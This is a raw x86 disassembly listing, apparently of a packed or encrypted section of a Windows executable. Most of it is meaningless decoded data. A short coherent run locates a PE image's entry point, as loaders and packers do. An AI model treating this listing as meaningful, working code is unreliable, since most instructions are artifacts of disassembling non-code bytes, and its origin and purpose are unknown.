  4185f0:	mov    edx,0xd8baeb5f
  4185f5:	xlat   BYTE PTR ds:[ebx]
  4185f6:	ins    DWORD PTR es:[edi],dx
  4185f7:	mov    ebp,0x4f09d180
  4185fc:	pusha  
  4185fd:	jg     0x41863f
  4185ff:	div    ch
  418601:	mov    ebx,0xcb13d056
  418606:	sbb    al,0xc7
  418608:	mov    esi,0xfba9d5a3
  41860d:	xchg   edx,eax
  41860e:	sub    al,0x90
  418610:	jns    0x41861d
  418612:	out    0xf2,eax
  418614:	add    BYTE PTR [ebp-0x104d4f5c],dh
  41861a:	imul   edx,DWORD PTR [ebp+0x60],0xc68521f8
  418621:	cdq    
  418622:	lea    ecx,[esi+0x7d844413]
  418628:	adc    al,0xac
  41862a:	adc    al,0x7f
  41862c:	jb     0x4185e8
  41862e:	push   eax
  41862f:	fstp   TBYTE PTR [ebp-0x7e]
  418632:	pop    edi
  418633:	pop    ds
  418634:	adc    dh,dl
  418636:	mov    ?,esi
  418638:	pop    eax
  418639:	pop    edi
  41863a:	push   eax
  41863b:	(bad)  
  41863d:	scas   al,BYTE PTR es:[edi]
  41863e:	aas    
  41863f:	mov    BYTE PTR ds:0x97f025c5,dh
  418645:	mov    esi,0x722473ac
  41864a:	(bad)  
  41864c:	(bad)  
  41864d:	sbb    al,0xe3
  41864f:	sub    eax,0xe7bd9d4f
  418654:	sub    cl,ah
  418656:	into   
  418657:	add    bl,BYTE PTR [esi-0x66]
  41865a:	aad    0x4d
  41865c:	xchg   esi,eax
  41865d:	je     0x418627
  41865f:	or     bl,BYTE PTR [esi]
  418661:	(bad)  
  418662:	jecxz  0x4186cc
  418664:	out    0x7d,al
  418666:	aad    0x8
  418668:	pop    es
  418669:	cmp    bh,BYTE PTR [ecx+eax*2]
  41866c:	xor    eax,0x84232aa1
  418671:	cmp    bh,0xe5
  418674:	arpl   WORD PTR [edi],di
  418676:	es xor ah,cl
  418679:	mov    ds:0xbcbea716,eax
  41867e:	dec    ecx
  41867f:	shr    BYTE PTR [ecx-0x61add5ad],1
  418685:	dec    eax
  418686:	mov    WORD PTR [edx+0x58],es
  418689:	into   
  41868a:	adc    DWORD PTR [ebx],edi
  41868c:	out    0xff,al
  41868e:	pop    es
  41868f:	mov    DWORD PTR [eax-0x786869d1],ebx
  418695:	(bad)  
  418696:	mov    ebp,0x20ac792b
  41869b:	out    dx,eax
  41869c:	xchg   edi,eax
  41869d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41869e:	ret    
  41869f:	jg     0x418664
  4186a1:	mov    bh,0x87
  4186a3:	push   edi
  4186a4:	neg    BYTE PTR [esi+0x7bfb9985]
  4186aa:	push   es
  4186ab:	test   eax,0x70daf98e
  4186b0:	shr    DWORD PTR [ebx-0x28],cl
  4186b3:	or     al,0xde
  4186b5:	xor    BYTE PTR [edx],bl
  4186b7:	pop    es
  4186b8:	int    0x99
  4186ba:	dec    esp
  4186bb:	add    eax,0x3029abd4
  4186c0:	out    0xc5,eax
  4186c2:	push   cs
  4186c3:	cdq    
  4186c4:	inc    edi
  4186c5:	sbb    eax,0x8f6185b1
  4186ca:	sub    eax,edi
  4186cc:	jmp    0x4186ac
  4186ce:	test   ah,bl
  4186d0:	or     eax,0x3b622eea
  4186d5:	and    eax,0x26e6e99f
  4186da:	leave  
  4186db:	inc    esp
  4186dc:	xorps  xmm6,XMMWORD PTR [edx-0x23]
  4186e0:	inc    ebx
  4186e1:	mov    bh,0x24
  4186e3:	ss and al,0xda
  4186e6:	sub    DWORD PTR ds:[edx-0x3d],edx
  4186ea:	and    DWORD PTR [ecx],edx
  4186ec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4186ed:	mov    dh,BYTE PTR cs:[esi]
  4186f0:	xchg   ebx,eax
  4186f1:	mov    dh,0xd9
  4186f3:	ds ins BYTE PTR es:[edi],dx
  4186f5:	sbb    BYTE PTR [eax+0x395ba46b],0x50
  4186fc:	sub    DWORD PTR [ecx],0xffffff91
  4186ff:	pop    esi
  418700:	nop
  418701:	test   BYTE PTR [bx+di-0x71b5],ah
  418706:	rol    BYTE PTR [esi-0x6a9357d],cl
  41870c:	mov    edi,0x5b45d34b
  418711:	out    0xc6,eax
  418713:	mov    ds:0xba108f62,al
  418718:	sbb    eax,0x3a4ae8f6
  41871d:	sbb    dh,BYTE PTR [ebx+eax*2]
  418720:	inc    eax
  418721:	cmp    dh,BYTE PTR [esi-0x57057014]
  418727:	dec    ebp
  418728:	mov    al,ds:0xbe1345c1
  41872d:	sub    BYTE PTR [edx],ch
  41872f:	pop    ebp
  418730:	fnstsw WORD PTR [esi]
  418732:	mov    dl,0x20
  418734:	dec    esp
  418735:	ret    
  418736:	adc    ah,bh
  418738:	cs ds push cs
  41873b:	inc    ecx
  41873c:	popf   
  41873d:	cld    
  41873e:	jl     0x418754
  418740:	adc    al,0xab
  418742:	mov    edi,0xa03648bd
  418747:	inc    edi
  418748:	scas   al,BYTE PTR es:[edi]
  418749:	jmp    0x8bce:0xc7c5ed8f
  418750:	pop    ebp
  418751:	mov    ebp,0x6aa3788a
  418756:	mov    bl,0x4b
  418758:	or     BYTE PTR [ecx-0x4d],0xb8
  41875c:	xchg   ebx,eax
  41875d:	jp     0x4187ab
  41875f:	in     eax,dx
  418760:	repnz pop esi
  418762:	cli    
  418763:	add    eax,ecx
  418765:	mov    ds:0x103473ea,eax
  41876a:	or     eax,0x50afbabd
  41876f:	pop    ds
  418770:	xor    DWORD PTR [ebx-0x58483948],edi
  418776:	enter  0x6962,0x96
  41877a:	ds push esi
  41877c:	mov    DWORD PTR [ecx],ebp
  41877e:	inc    eax
  41877f:	lods   eax,DWORD PTR ds:[esi]
  418780:	add    al,0x9c
  418782:	or     bl,BYTE PTR [eax-0x1f]
  418785:	inc    ebp
  418786:	mov    DWORD PTR [edx],ecx
  418788:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418789:	push   eax
  41878a:	dec    edi
  41878b:	mov    esi,esp
  41878d:	push   ecx
  41878e:	cmp    ebx,ecx
  418790:	sar    DWORD PTR [ebp-0x15],1
  418793:	mov    ch,0xae
  418795:	cmc    
  418796:	aad    0x5
  418798:	or     eax,0x6c6257d9
  41879d:	or     eax,0xef0aa64d
  4187a2:	inc    edi
  4187a3:	dec    ecx
  4187a4:	xor    cx,WORD PTR [edx]
  4187a7:	loope  0x41872d
  4187a9:	inc    ebx
  4187aa:	aam    0x42
  4187ac:	loope  0x418822
  4187ae:	xor    eax,0xe4225ac9
  4187b3:	xchg   esp,eax
  4187b4:	in     al,dx
  4187b5:	ja     0x4187d0
  4187b7:	cmp    DWORD PTR gs:[edi+esi*4+0x29d6dc1e],ebp
  4187bf:	xchg   BYTE PTR [edi+edi*4+0x7a12b48c],dh
  4187c6:	sub    BYTE PTR [edx+edx*8-0x1e44caf5],0xaf
  4187ce:	jecxz  0x4187dc
  4187d0:	jbe    0x4187c3
  4187d2:	leave  
  4187d3:	dec    esp
  4187d4:	adc    al,0x78
  4187d6:	jno    0x418827
  4187d8:	adc    esp,DWORD PTR [eax+0x52]
  4187db:	int3   
  4187dc:	sbb    eax,0xf4401012
  4187e1:	xchg   ebx,eax
  4187e2:	and    ah,BYTE PTR [ebx-0x4f]
  4187e5:	xor    dh,al
  4187e7:	div    BYTE PTR [edx-0x7b]
  4187ea:	or     al,BYTE PTR [ecx-0x3272973f]
  4187f0:	dec    DWORD PTR [ebx+0x3f033f1]
  4187f6:	jne    0x418800
  4187f8:	mov    DWORD PTR [ebp+0x8],esi
  4187fb:	mov    esi,DWORD PTR [ebp+0x8]
  4187fe:	xor    esi,ecx
  418800:	xor    esi,eax
  418802:	mov    eax,DWORD PTR [edx+0x194]
  418808:	mov    ecx,DWORD PTR [eax]
  41880a:	mov    eax,DWORD PTR [ecx+0x3c]
  41880d:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  418811:	add    eax,ecx
  418813:	mov    DWORD PTR [ebp+0x8],esi
  418816:	mov    DWORD PTR [ebp+0x10],eax
  418819:	mov    eax,DWORD PTR [ebp+0x10]
  41881c:	pop    esi
  41881d:	test   eax,eax
  41881f:	je     0x419191
  418825:	push   DWORD PTR ds:0x41ebbe
  41882b:	jmp    0x418b45
  418830:	cmp    eax,0xcbd3c4c6
  418835:	rcl    ebp,1
  418837:	fcmove st,st(3)
  418839:	test   eax,0xd6211af2
  41883e:	pop    edi
  41883f:	cld    
  418840:	pop    ss
  418841:	ds jg  0x4188bc
  418844:	jnp    0x4188c4
  418846:	js     0x4188c0
  418848:	sbb    eax,0x20cf66fd
  41884d:	test   cl,cl
  41884f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418850:	das    
  418851:	cs jno 0x4188b7
  418854:	xchg   ebp,eax
  418855:	xchg   edx,eax
  418856:	mov    bh,0x3a
  418858:	inc    ecx
  418859:	lahf   
  41885a:	lea    esp,[ecx]
  41885c:	mov    edx,0xbecc2028
  418861:	mov    ah,0x21
  418863:	dec    esp
  418864:	dec    edx
  418865:	inc    ebp
  418866:	icebp  
  418867:	int    0xa
  418869:	mov    ebx,0xdc7bdf1f
  41886e:	sbb    eax,0xbb296614
  418873:	sub    BYTE PTR ss:[ebp+0x1d7c594e],bl
  41887a:	adc    al,0xb4
  41887c:	js     0x41889a
  41887e:	and    DWORD PTR [ebx+0x38],esi
  418881:	adc    BYTE PTR [ebx],ch
  418883:	and    eax,0xa5cc67c5
  418888:	push   ss
  418889:	int    0xb2
  41888b:	inc    esp
  41888c:	bound  ecx,QWORD PTR [eax-0x4c20f754]
  418892:	loope  0x41883c
  418894:	ins    BYTE PTR es:[edi],dx
  418895:	inc    esp
  418896:	arpl   WORD PTR [ecx],bx
  418898:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418899:	ins    BYTE PTR es:[edi],dx
  41889a:	xlat   BYTE PTR ds:[ebx]
  41889b:	pop    ds
  41889c:	cmp    ah,BYTE PTR [edx+0x7b]
  41889f:	pop    ecx
  4188a0:	xchg   DWORD PTR [eax+0x3d],ebp
  4188a3:	xchg   BYTE PTR [edi],al
  4188a5:	inc    edx
  4188a6:	mov    BYTE PTR fs:[ecx+esi*4+0x3b],0x26
  4188ac:	mov    ah,0xc8
  4188ae:	in     eax,dx
  4188af:	jecxz  0x418853
  4188b1:	cli    
  4188b2:	pop    es
  4188b3:	(bad)  
  4188b4:	adc    DWORD PTR [ebx],ecx
  4188b6:	cwde   
  4188b7:	scas   al,BYTE PTR es:[edi]
  4188b8:	cdq    
  4188b9:	adc    edi,DWORD PTR [ebp-0x2]
  4188bc:	push   eax
  4188bd:	xor    esi,DWORD PTR [ecx]
  4188bf:	test   edx,esi
  4188c1:	in     al,dx
  4188c2:	and    al,0x92
  4188c4:	bound  ebp,QWORD PTR [edi]
  4188c6:	push   esp
  4188c7:	js     0x418939
  4188c9:	jg     0x4188d9
  4188cb:	test   eax,0xa01c08ed
  4188d0:	ja     0x418895
  4188d2:	xor    eax,0x7c6b880a
  4188d7:	mov    edx,0xb3390082
  4188dc:	mov    BYTE PTR [ecx],al
  4188de:	dec    DWORD PTR [edi-0x55]
  4188e1:	mov    eax,0x3d3834db
  4188e6:	test   al,0xbc
  4188e8:	(bad)  
  4188e9:	sbb    BYTE PTR [esi-0x2965d65a],al
  4188ef:	mov    es,WORD PTR [ebx-0x51bcd674]
  4188f5:	(bad)  
  4188f6:	out    dx,al
  4188f7:	inc    eax
  4188f8:	dec    edi
  4188f9:	pop    eax
  4188fa:	mov    dl,0xc3
  4188fc:	push   0xffffffcf
  4188fe:	cmp    BYTE PTR [ebx+eax*8+0x14],bl
  418902:	mov    al,BYTE PTR [ebx-0x7605f73c]
  418908:	jno    0x4188f0
  41890a:	push   es
  41890b:	outs   dx,BYTE PTR ds:[esi]
  41890c:	repz out 0x1b,al
  41890f:	stc    
  418910:	das    
  418911:	(bad)  
  418912:	jno    0x4188f3
  418914:	cmp    BYTE PTR [ebp-0x193a2377],0x45
  41891b:	xchg   esi,eax
  41891c:	iret   
  41891d:	add    eax,0xbe99eaf3
  418922:	xchg   ebx,edi
  418924:	jmp    0xd56a0868
  418929:	adc    DWORD PTR [esi+0x4afc6441],esp
  41892f:	dec    esp
  418930:	jmp    0x3bc:0x53e81e03
  418937:	or     eax,0x23281837
  41893c:	shl    BYTE PTR [ebp+eax*1-0x73],0x3d
  418941:	imul   ebx,DWORD PTR [ebp+eax*2+0x698862a9],0x67
  418949:	xchg   esp,eax
  41894a:	popa   
  41894b:	sbb    esp,DWORD PTR [edi-0x33]
  41894e:	int3   
  41894f:	push   edx
  418950:	pop    ds
  418951:	stos   DWORD PTR es:[edi],eax
  418952:	enter  0xaa01,0x3
  418956:	fstp   DWORD PTR [eax]
  418958:	mov    dh,0x5a
  41895a:	dec    ebp
  41895b:	cld    
  41895c:	js     0x41896c
  41895e:	ds mov cl,0x3e
  418961:	call   0x9bcfde06
  418966:	jmp    0x444d:0x865442e4
  41896d:	ret    
  41896e:	ret    0x48b3
  418971:	ja     0x418966
  418973:	xchg   ebx,eax
  418974:	dec    ebp
  418975:	push   eax
  418976:	inc    ecx
  418977:	fdivr  QWORD PTR [ebx-0x70]
  41897a:	xor    ecx,edx
  41897c:	dec    eax
  41897d:	mov    ds:0x347deda2,eax
  418982:	ja     0x4189e3
  418984:	les    ecx,FWORD PTR ds:[esi+0x9]
  418988:	sbb    BYTE PTR [edi-0x4e],dh
  41898b:	(bad)  
  41898c:	cs push ebx
  41898e:	xor    dh,bl
  418990:	aas    
  418991:	push   es
  418992:	dec    ebx
  418993:	test   DWORD PTR [esi],eax
  418995:	pop    edx
  418996:	or     eax,0x83d3d73f
  41899b:	pop    ss
  41899c:	loope  0x418987
  41899e:	loopne 0x41899a
  4189a0:	gs addr16 jmp 0x656d57f7
  4189a7:	pop    ebp
  4189a8:	fisubr WORD PTR [edx+0x3553b233]
  4189ae:	xchg   esi,eax
  4189af:	lods   eax,DWORD PTR ds:[esi]
  4189b0:	daa    
  4189b1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4189b2:	or     al,0xf3
  4189b4:	cld    
  4189b5:	mov    cl,0x0
  4189b7:	fwait
  4189b8:	inc    edi
  4189b9:	sbb    al,0x96
  4189bb:	retf   
  4189bc:	cmp    ah,BYTE PTR [edi]
  4189be:	mov    esi,0x6ed55205
  4189c3:	sbb    al,0xc1
  4189c5:	ror    bl,cl
  4189c7:	sbb    al,0xcb
  4189c9:	inc    esi
  4189ca:	and    BYTE PTR [ecx],0xa9
  4189cd:	xchg   BYTE PTR [ebp+0x77ddc359],bh
  4189d3:	cmp    eax,0xbfc275e3
  4189d8:	mov    WORD PTR [esi],ss
  4189da:	or     bl,BYTE PTR [edi+0x61d2d9d4]
  4189e0:	shr    BYTE PTR [eax-0x75],0x30
  4189e4:	jnp    0x418a2e
  4189e6:	fldcw  WORD PTR [esi+esi*1+0x23]
  4189ea:	adc    eax,0x5e8d0215
  4189ef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4189f0:	push   ecx
  4189f1:	jmp    ecx
  4189f3:	test   BYTE PTR [edi+0x70],0xb2
  4189f7:	or     al,0xb
  4189f9:	push   0xcd047d9b
  4189fe:	jge    0x4189ff
  418a00:	sbb    al,0x2b
  418a02:	cmp    esi,ecx
  418a04:	aaa    
  418a05:	push   edx
  418a06:	mov    eax,ds:0x688a2c7d
  418a0b:	and    al,0x6c
  418a0d:	fisubr DWORD PTR [ecx+0x3795797]
  418a13:	mov    dh,0xf0
  418a15:	ret    
  418a16:	ret    0x9c40
  418a19:	push   edx
  418a1a:	test   BYTE PTR es:[eax-0x69755d35],bl
  418a21:	aam    0x1a
  418a23:	int3   
  418a24:	jmp    0x4189d4
  418a26:	mov    DWORD PTR [esi-0x58],esp
  418a29:	mov    WORD PTR [ecx+0x34b75893],?
  418a2f:	jno    0x418a0b
  418a31:	mov    bl,0x2
  418a33:	cld    
  418a34:	cmp    DWORD PTR [ebx+0x15],eax
  418a37:	pushf  
  418a38:	(bad)  
  418a39:	loopne 0x418ab3
  418a3b:	das    
  418a3c:	sbb    al,0x9c
  418a3e:	mov    ds:0x4d5d5ac1,eax
  418a43:	mov    ah,0x91
  418a45:	les    edx,FWORD PTR [ebx+edi*2+0x18]
  418a49:	imul   DWORD PTR [eax-0x16055b8c]
  418a4f:	jp     0x418a6e
  418a51:	adc    dl,BYTE PTR [ecx]
  418a53:	adc    ah,ch
  418a55:	ss cld 
  418a57:	jg     0x4189dd
  418a59:	adc    al,0x50
  418a5b:	xor    DWORD PTR [edx-0x35f96ca7],eax
  418a61:	lods   al,BYTE PTR ds:[esi]
  418a62:	mov    bl,0xf5
  418a64:	jno    0x4189ea
  418a66:	lods   al,BYTE PTR ds:[esi]
  418a67:	pop    edx
  418a68:	xchg   al,ch
  418a6a:	push   ds
  418a6b:	add    BYTE PTR [ebx],bh
  418a6d:	adc    eax,0xcc6399d9
  418a72:	inc    edi
  418a73:	jns    0x418a4d
  418a75:	das    
  418a76:	mov    DWORD PTR [eax+0x60],ebx
  418a79:	loop   0x418ad3
  418a7b:	mov    ds:0x26338553,al
  418a80:	inc    edx
  418a81:	xchg   edi,eax
  418a82:	xor    bl,bh
  418a84:	shr    bl,0x6e
  418a87:	cli    
  418a88:	leave  
  418a89:	data16 mul BYTE PTR ds:[esi]
  418a8d:	popf   
  418a8e:	popa   
  418a8f:	jns    0x418a74
  418a91:	(bad)  
  418a92:	pop    ds
  418a93:	int    0x6e
  418a95:	mov    ecx,0x9bfb388c
  418a9a:	mov    edi,0x15ce1af1
  418a9f:	bound  edx,QWORD PTR [edx]
  418aa1:	add    eax,DWORD PTR [esi-0x4c]
  418aa4:	popf   
  418aa5:	mov    ds:0xc58a072,al
  418aaa:	pusha  
  418aab:	fstp   DWORD PTR [edi+eiz*2-0x524e8713]
  418ab2:	push   cs
  418ab3:	add    ecx,ecx
  418ab5:	rol    BYTE PTR ds:0xe7d8e1f5,1
  418abb:	pop    esi
  418abc:	test   al,0x6d
  418abe:	push   esi
  418abf:	das    
  418ac0:	test   DWORD PTR [edx-0x2a24c42],ebx
  418ac6:	mov    ah,0x38
  418ac8:	jle    0x418b39
  418aca:	cli    
  418acb:	dec    ebx
  418acc:	loope  0x418b07
  418ace:	rol    BYTE PTR [esi-0x54],cl
  418ad1:	cmp    DWORD PTR [ebp+0x2818ce33],esi
  418ad7:	sub    BYTE PTR [eax-0x2c],dh
  418ada:	stos   DWORD PTR es:[edi],eax
  418adb:	dec    eax
  418adc:	jo     0x418abb
  418ade:	dec    edx
  418adf:	adc    BYTE PTR [esi-0x4d7f99a],0x6d
  418ae6:	shl    BYTE PTR [edx-0x5097ca13],0xf8
  418aed:	mov    DWORD PTR [edx+esi*1-0x7ea8089f],edi
  418af4:	ret    0x50ff
  418af7:	sub    ecx,esp
  418af9:	nop
  418afa:	mov    ds:0x2a931d1b,al
  418aff:	jns    0x418b5b
  418b01:	inc    esp
  418b02:	in     eax,dx
  418b03:	and    eax,0xf237de9a
  418b08:	xchg   ecx,eax
  418b09:	cmp    eax,0xbe483f9
  418b0e:	or     ecx,DWORD PTR [ecx+0x6f305a5d]
  418b14:	xor    al,0xcf
  418b16:	dec    ebp
  418b17:	outs   dx,BYTE PTR ds:[esi]
  418b18:	ja     0x418b5f
  418b1a:	xor    BYTE PTR [ecx],0x33
  418b1d:	dec    ebp
  418b1e:	cmp    al,0x14
  418b20:	aad    0xa5
  418b22:	fadd   DWORD PTR [edx]
  418b24:	sub    al,al
  418b26:	mov    esp,0x65d21998
  418b2b:	pusha  
  418b2c:	ss mov edx,0xfe63d158
  418b32:	mov    dh,0xb2
  418b34:	in     eax,0x17
  418b36:	mov    edi,0xfe7131af
  418b3b:	in     al,dx
  418b3c:	mov    DWORD PTR [ebx+0x5d],0xbeed0c29
  418b43:	into   
  418b44:	pop    ds
  418b45:	push   DWORD PTR ds:0x41e96a
  418b4b:	mov    eax,DWORD PTR [edx+0x194]
  418b51:	jmp    0x418e6b
  418b56:	retf   
  418b57:	into   
  418b58:	ret    
  418b59:	ret    
  418b5a:	(bad)  
  418b5c:	retf   
  418b5d:	(bad)  
  418b5e:	xor    dh,cl
  418b60:	stos   DWORD PTR es:[edi],eax
  418b61:	push   eax
  418b62:	or     DWORD PTR [esi-0x5a],edi
  418b65:	popa   
  418b66:	adc    al,bl
  418b68:	jg     0x418be2
  418b6a:	jnp    0x418bea
  418b6c:	js     0x418be6
  418b6e:	inc    edx
  418b6f:	dec    ebp
  418b70:	xchg   esp,eax
  418b71:	mov    dl,0x7a
  418b73:	jge    0x418be0
  418b75:	pop    eax
  418b76:	cmp    ch,0xe8
  418b79:	jmp    0xf175:0x1d0103bd
  418b80:	pop    edi
  418b81:	shl    BYTE PTR [ecx+0x325a56d9],0x14
  418b88:	stc    
  418b89:	pop    edx
  418b8a:	or     al,0x7f
  418b8c:	and    dl,BYTE PTR cs:[ebp+edx*8+0x6f1c2615]
  418b94:	or     BYTE PTR fs:[eax+0xe],dl
  418b98:	mov    ds:0x30e164be,al
  418b9d:	sahf   
  418b9e:	in     eax,dx
  418b9f:	inc    esi
  418ba0:	add    DWORD PTR [ebx+eiz*2],esp
  418ba3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418ba4:	jb     0x418c00
  418ba6:	shl    DWORD PTR [ebx+0x1f974546],cl
  418bac:	imul   edx,ebp,0x6c
  418baf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418bb0:	out    dx,eax
  418bb1:	dec    edi
  418bb2:	jecxz  0x418b4c
  418bb4:	fisttp DWORD PTR [ebp+0x43d97f62]
  418bba:	pop    eax
  418bbb:	mov    WORD PTR [eax-0x19],ds
  418bbe:	test   BYTE PTR [edx+eiz*1-0x66adb136],0xe6
  418bc6:	popf   
  418bc7:	and    BYTE PTR [ebp+ebx*1-0xe8bf6f9],cl
  418bce:	fs push esi
  418bd0:	hlt    
  418bd1:	sbb    al,0xe6
  418bd3:	jecxz  0x418c46
  418bd5:	xor    DWORD PTR [ecx],eax
  418bd7:	jnp    0x418c17
  418bd9:	mov    cl,bl
  418bdb:	adc    DWORD PTR [edi-0x4ca9b3b9],ecx
  418be1:	mov    ebx,0x25832ad1
  418be6:	jmp    0x5eb6:0x182e1b0b
  418bed:	stos   DWORD PTR es:[edi],eax
  418bee:	jae    0x418bf5
  418bf0:	push   esi
  418bf1:	ret    0x48df
  418bf4:	cld    
  418bf5:	dec    ecx
  418bf6:	pop    esi
  418bf7:	retf   
  418bf8:	test   DWORD PTR [edi-0x38],esp
  418bfb:	das    
  418bfc:	nop
  418bfd:	xchg   ecx,eax
  418bfe:	add    ah,BYTE PTR [edx-0x70]
  418c01:	cld    
  418c02:	mov    bh,0xdd
  418c04:	inc    eax
  418c05:	jno    0x418c6e
  418c07:	icebp  
  418c08:	repnz ins DWORD PTR es:[edi],dx
  418c0a:	int3   
  418c0b:	or     al,0x20
  418c0d:	adc    ecx,DWORD PTR [ebp-0x5]
  418c10:	mov    ah,0x64
  418c12:	dec    esp
  418c13:	fdiv   QWORD PTR [ecx-0xd42ea2]
  418c19:	clc    
  418c1a:	pop    es
  418c1b:	xor    eax,0xdf0119be
  418c20:	inc    eax
  418c21:	mov    ecx,0x90b01db1
  418c26:	sbb    dh,BYTE PTR [ecx+edx*8]
  418c29:	mov    al,ds:0x8931765c
  418c2e:	rcr    al,0xe
  418c31:	pop    ebp
  418c32:	mov    BYTE PTR [ebp-0x17],bl
  418c35:	daa    
  418c36:	das    
  418c37:	fs scas eax,DWORD PTR es:[edi]
  418c39:	cwde   
  418c3a:	out    0x62,eax
  418c3c:	adc    DWORD PTR [ebp+0x62],eax
  418c3f:	lods   al,BYTE PTR ds:[esi]
  418c40:	mov    ebx,0xdb6a8042
  418c45:	adc    BYTE PTR [ebx+0x6d],bl
  418c48:	lods   eax,DWORD PTR ds:[esi]
  418c49:	mov    DWORD PTR [ebp-0x7],ebx
  418c4c:	(bad)  
  418c4d:	jbe    0x418c0a
  418c4f:	and    edx,DWORD PTR [esp+edx*2-0x51]
  418c53:	pusha  
  418c54:	xchg   edi,eax
  418c55:	jae    0x418cb4
  418c57:	xchg   esi,eax
  418c58:	in     al,dx
  418c59:	in     al,dx
  418c5a:	pushf  
  418c5b:	test   eax,0x4d806092
  418c60:	push   cs
  418c61:	mov    ?,WORD PTR [ebx+0x55]
  418c64:	mov    DWORD PTR [ecx-0x9fee222],esi
  418c6a:	sbb    eax,DWORD PTR [ebp+0x5a8d96bf]
  418c70:	mov    esp,0xf866c680
  418c75:	xchg   edx,eax
  418c76:	rcl    DWORD PTR [edi+0x59],cl
  418c79:	xchg   ebx,edx
  418c7b:	and    DWORD PTR [ebp-0x7b93e2b3],ecx
  418c81:	add    ebx,DWORD PTR [edx+0x12]
  418c84:	sub    bh,BYTE PTR [esi+0x10]
  418c87:	dec    edx
  418c88:	or     al,0x4e
  418c8a:	jmp    0x418c89
  418c8c:	fld    QWORD PTR [edi]
  418c8e:	or     al,0xf9
  418c90:	jns    0x418d0f
  418c92:	push   ecx
  418c93:	pop    ss
  418c94:	push   ds
  418c95:	montmul (bad)
  418c96:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418c97:	ret    0x66cc
  418c9a:	(bad)  
  418c9b:	push   0x9c4883ac
  418ca0:	inc    edi
  418ca1:	mov    edi,0x19762d91
  418ca6:	fisubr WORD PTR [ebx]
  418ca8:	inc    esp
  418ca9:	mov    ch,0x68
  418cab:	adc    bl,BYTE PTR [ebx+ebp*1+0x3f]
  418caf:	sbb    eax,0x1b34218d
  418cb4:	(bad)  
  418cb5:	sbb    ah,BYTE PTR [ecx+eax*1-0x24]
  418cb9:	cmp    DWORD PTR [ebp+0x35],ecx
  418cbc:	cmp    edi,0xffffffa1
  418cbf:	fst    DWORD PTR [ebx-0x45]
  418cc2:	pop    ebx
  418cc3:	mov    ah,0x4f
  418cc5:	xchg   esp,eax
  418cc6:	xchg   ebp,eax
  418cc7:	push   es
  418cc8:	xor    esi,DWORD PTR gs:[eax]
  418ccb:	loop   0x418d2a
  418ccd:	fbstp  TBYTE PTR [edx+0x6]
  418cd0:	je     0x418c9e
  418cd2:	inc    edi
  418cd3:	pop    esp
  418cd4:	mov    al,ds:0xc7ce8d70
  418cd9:	ret    0x65c4
  418cdc:	push   es
  418cdd:	pop    ecx
  418cde:	daa    
  418cdf:	(bad)
  418ce2:	test   eax,0xb2d1e962
  418ce7:	sbb    edx,ebp
  418ce9:	cmp    bl,bl
  418ceb:	(bad)  
  418cec:	nop
  418ced:	shl    edx,0x7a
  418cf0:	out    0xcb,eax
  418cf2:	mov    bl,0x12
  418cf4:	ret    0x4ba8
  418cf7:	add    ebp,DWORD PTR [eax-0x80]
  418cfa:	enter  0x79a2,0xe7
  418cfe:	pop    ds
  418cff:	adc    DWORD PTR [eax-0x66],0x7e
  418d03:	jp     0x418c8b
  418d05:	mov    WORD PTR [ebx+0x3f],ds
  418d08:	dec    ebp
  418d09:	xor    BYTE PTR [ebp+0x71c541c3],bl
  418d0f:	and    eax,0x83393cd5
  418d14:	adc    eax,0xbadcb675
  418d19:	sub    ch,0xa
  418d1c:	in     ax,0x48
  418d1f:	popa   
  418d20:	add    al,0x4
  418d22:	arpl   WORD PTR [esi-0x5cf569f8],si
  418d28:	add    eax,0x569a111a
  418d2d:	and    al,0x96
  418d2f:	xadd   BYTE PTR [ecx+0x407ddf62],cl
  418d36:	dec    ecx
  418d37:	inc    ecx
  418d38:	push   ebp
  418d39:	sub    al,0xc3
  418d3b:	dec    edi
  418d3c:	pop    edx
  418d3d:	rol    BYTE PTR [ecx+esi*4+0x69e1a939],1
  418d44:	mov    bl,0x56
  418d46:	jns    0x418cfa
  418d48:	popf   
  418d49:	out    0xac,eax
  418d4b:	cmc    
  418d4c:	loopne 0x418d1f
  418d4e:	cmp    eax,0x86ac0abe
  418d53:	ret    
  418d54:	aam    0x54
  418d56:	loop   0x418d5a
  418d58:	dec    eax
  418d59:	inc    esp
  418d5a:	or     al,0x5a
  418d5c:	or     DWORD PTR [ecx+0x34],ecx
  418d5f:	std    
  418d60:	popf   
  418d61:	sub    edx,edi
  418d63:	stc    
  418d64:	inc    ebx
  418d65:	rol    DWORD PTR [edx+ebp*1-0x2e],cl
  418d69:	ja     0x418dbc
  418d6b:	nop
  418d6c:	mov    al,ds:0xd77eaf86
  418d71:	cmp    cl,BYTE PTR [ecx]
  418d73:	xchg   BYTE PTR [edx+0x27],cl
  418d76:	int    0x3e
  418d78:	mov    dl,0x7f
  418d7a:	mov    edi,0xcd3588b8
  418d7f:	dec    esi
  418d80:	retf   0xf7ec
  418d83:	call   0x49f8579d
  418d88:	inc    esp
  418d89:	jmp    0xafa9a1ba
  418d8e:	and    bl,BYTE PTR [esi]
  418d90:	pop    ss
  418d91:	mov    bl,BYTE PTR [esp+edi*1]
  418d94:	pop    edx
  418d95:	or     eax,0xde6c2aff
  418d9a:	sbb    BYTE PTR [edi-0x2f13771c],dl
  418da0:	ins    BYTE PTR es:[edi],dx
  418da1:	mov    ch,0xaa
  418da3:	sbb    ecx,DWORD PTR [bp-0x7bb8]
  418da8:	xchg   ah,bl
  418daa:	mov    cl,0xb4
  418dac:	mov    eax,ds:0x77c47391
  418db1:	dec    ecx
  418db2:	je     0x418ddb
  418db4:	dec    ebp
  418db5:	addr16 push ebx
  418db7:	inc    ecx
  418db8:	sahf   
  418db9:	sub    bh,BYTE PTR [esi]
  418dbb:	ins    DWORD PTR es:[edi],dx
  418dbc:	xor    eax,DWORD PTR [ebx-0x1a84e2d4]
  418dc2:	jecxz  0x418da5
  418dc4:	jbe    0x418d6f
  418dc6:	repnz (bad) 
